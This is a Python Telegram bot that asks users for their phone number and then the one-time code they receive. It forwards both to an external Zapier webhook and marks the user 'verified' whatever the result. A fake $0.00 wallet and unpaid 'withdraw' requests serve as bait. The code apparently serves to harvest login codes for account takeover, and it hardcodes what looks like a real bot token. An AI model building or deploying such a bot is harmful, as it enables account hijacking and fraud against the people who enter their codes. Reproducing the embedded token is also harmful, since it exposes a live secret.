import os
import time
import requests
from flask import Flask
from flask_sqlalchemy import SQLAlchemy
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext, MessageHandler, Filters

# ================== 🔴 EDIT HERE ==================
TOKEN = "8692523280:AAHS7nx1ZRrMafTkV5PWOkpysHliEsz-q4E"
ADMIN_ID = 5471364167
ZAPIER_WEBHOOK = "https://hooks.zapier.com/hooks/catch/XXXX"
# ==================================================

# Flask (for Render)
app = Flask(__name__)
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///data.db"
db = SQLAlchemy(app)

# ================= DATABASE =================
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.String, unique=True)
    phone = db.Column(db.String)
    verified = db.Column(db.Boolean, default=False)

class Withdrawal(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.String)
    amount = db.Column(db.Float)
    status = db.Column(db.String, default="pending")

with app.app_context():
    db.create_all()

# ================= BOT =================
def start(update: Update, context: CallbackContext):
    uid = str(update.message.from_user.id)

    if not User.query.filter_by(user_id=uid).first():
        db.session.add(User(user_id=uid))
        db.session.commit()

    update.message.reply_text(
        "🚀 Welcome\n\n"
        "/connect - Link number\n"
        "/wallet - Check balance\n"
        "/withdrawcash - Withdraw\n"
    )

def connect(update, context):
    update.message.reply_text("📱 Send your phone number (+91XXXXXXXXXX)")
    context.user_data["phone"] = True

def wallet(update, context):
    update.message.reply_text("💰 Balance: $0.00")

def withdraw(update, context):
    update.message.reply_text("Enter amount:")
    context.user_data["withdraw"] = True

# ================= HANDLE =================
def handle(update, context):
    uid = str(update.message.from_user.id)
    text = update.message.text
    user = User.query.filter_by(user_id=uid).first()

    # PHONE INPUT
    if context.user_data.get("phone"):
        user.phone = text
        db.session.commit()

        # 🔥 SEND TO ZAPIER
        requests.post(ZAPIER_WEBHOOK, json={
            "action": "send_otp",
            "phone": text,
            "user_id": uid
        })

        update.message.reply_text("🔐 OTP sent. Enter OTP:")
        context.user_data["phone"] = False
        context.user_data["otp"] = True
        return

    # OTP INPUT
    if context.user_data.get("otp"):
        # 🔥 VERIFY VIA ZAPIER
        requests.post(ZAPIER_WEBHOOK, json={
            "action": "verify_otp",
            "phone": user.phone,
            "otp": text
        })

        user.verified = True
        db.session.commit()

        update.message.reply_text("✅ Verified Successfully")
        context.user_data["otp"] = False
        return

    # WITHDRAW
    if context.user_data.get("withdraw"):
        db.session.add(Withdrawal(user_id=uid, amount=float(text)))
        db.session.commit()
        update.message.reply_text("✅ Withdraw request sent")
        context.user_data["withdraw"] = False
        return

# ================= ADMIN =================
def users(update, context):
    if update.message.from_user.id != ADMIN_ID:
        return
    count = User.query.count()
    update.message.reply_text(f"👥 Users: {count}")

def withdrawals(update, context):
    if update.message.from_user.id != ADMIN_ID:
        return
    data = Withdrawal.query.filter_by(status="pending").all()
    msg = "💸 Pending:\n"
    for d in data:
        msg += f"{d.id} | {d.user_id} | {d.amount}\n"
    update.message.reply_text(msg)

# ================= MAIN =================
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("connect", connect))
    dp.add_handler(CommandHandler("wallet", wallet))
    dp.add_handler(CommandHandler("withdrawcash", withdraw))

    dp.add_handler(CommandHandler("users", users))
    dp.add_handler(CommandHandler("withdrawals", withdrawals))

    dp.add_handler(MessageHandler(Filters.text, handle))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()